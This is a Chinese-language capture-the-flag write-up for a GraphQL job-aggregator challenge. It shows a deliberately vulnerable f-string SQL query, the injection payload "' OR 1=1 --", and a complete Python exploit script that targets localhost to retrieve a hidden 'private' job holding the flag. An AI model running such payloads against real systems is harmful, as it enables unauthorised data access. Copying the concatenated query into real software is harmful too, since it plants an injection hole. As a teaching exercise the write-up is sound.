# Writeup

## 1、题目描述

这是一个基于 GraphQL 的职位聚合网站漏洞挖掘题目。网站提供了一个职位筛选功能，用户可以通过 job_type 参数来筛选不同类型的职位（front-end、back-end）。然而，存在一个 private 类型的隐藏职位包含 flag，正常情况下用户无法访问。需要通过 SQL 注入绕过权限验证获取 flag。

## 2、知识点

- **SQL 注入**: 通过在输入参数中插入恶意 SQL 代码，绕过应用程序的安全检查
- **GraphQL**: 查询语言和运行时，用于 API 的数据查询和操作
- **字符串拼接漏洞**: 直接将用户输入拼接到 SQL 查询中，导致 SQL 注入
- **布尔盲注**: 使用 OR 1=1 等条件绕过筛选逻辑

## 3、题目解题方法思路

**关键路径**: GraphQL 查询 → job_type 参数 → SQL 注入 → 绕过 private 检查

**使用的知识点**:

- 分析前端 GraphQL 查询语法
- 审计后端 SQL 查询构造逻辑
- 利用字符串拼接漏洞进行 SQL 注入

**工具和方法**:

- 代码审计发现漏洞点
- 构造 `"' OR 1=1 --"` payload
- 通过 Python requests 发送 GraphQL 请求

**漏洞分析**:
在 app.py 第 44 行存在关键漏洞：

```python
query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
```

直接将用户输入拼接到 SQL 查询中，且虽然第 40 行检查了 `job_type == 'private'`，但可以通过 SQL 注入绕过。

## 4、解题步骤

### 步骤 1: 代码审计

- 分析 index.html 发现 GraphQL 查询格式
- 审计 app.py 发现 SQL 注入点和 private 权限检查

### 步骤 2: 漏洞验证

- 发现 `query = f"SELECT * FROM jobs WHERE type = '{job_type}'"` 存在字符串拼接漏洞
- 虽然有 `job_type == 'private'` 检查，但可通过注入绕过

### 步骤 3: 构造 Payload

使用 `"' OR 1=1 --"` 使 SQL 查询变为：

```sql
SELECT * FROM jobs WHERE type = '' OR 1=1 --'
```

这样会返回所有记录，包括 private 类型的职位

### 步骤 4: 发送请求

通过 GraphQL 接口发送恶意查询获取所有职位信息

### 步骤 5: 获取 Flag

从返回结果中的 private 类型职位描述字段获取 flag

## 5、EXP

```python
import requests
import json

def exploit_sql_injection():
    """
    利用 SQL 注入获取包含 flag 的 private 职位信息
    """
    url = "http://localhost:8000/graphql/"

    # SQL 注入 payload: ' OR 1=1 --
    # 这将使 SQL 查询变为: SELECT * FROM jobs WHERE type = '' OR 1=1 --'
    # 从而绕过 private 检查并返回所有记录
    payload = "' OR 1=1 --"

    # 构造 GraphQL 查询
    graphql_query = {
        "query": f'''
        query {{
            jobs(jobType: "{payload}") {{
                id
                name
                type
                description
            }}
        }}
        '''
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        print("[*] 发送 SQL 注入请求...")
        print(f"[*] Payload: {payload}")

        response = requests.post(url, headers=headers, json=graphql_query)

        if response.status_code == 200:
            result = response.json()

            if 'errors' in result:
                print(f"[!] GraphQL 错误: {result['errors']}")
                return

            jobs = result.get('data', {}).get('jobs', [])
            print(f"[+] 成功获取 {len(jobs)} 个职位信息")

            # 查找包含 flag 的 private 职位
            for job in jobs:
                print(f"[*] 职位: {job['name']} | 类型: {job['type']} | 描述: {job['description']}")

                if job['type'] == 'private':
                    print(f"[+] 找到 Flag: {job['description']}")
                    return job['description']

        else:
            print(f"[!] 请求失败，状态码: {response.status_code}")
            print(f"[!] 响应内容: {response.text}")

    except Exception as e:
        print(f"[!] 请求异常: {str(e)}")

if __name__ == "__main__":
    flag = exploit_sql_injection()

    if flag:
        print(f"\n[+] 成功获取 Flag: {flag}")
    else:
        print("\n[!] 未能获取 Flag")
```
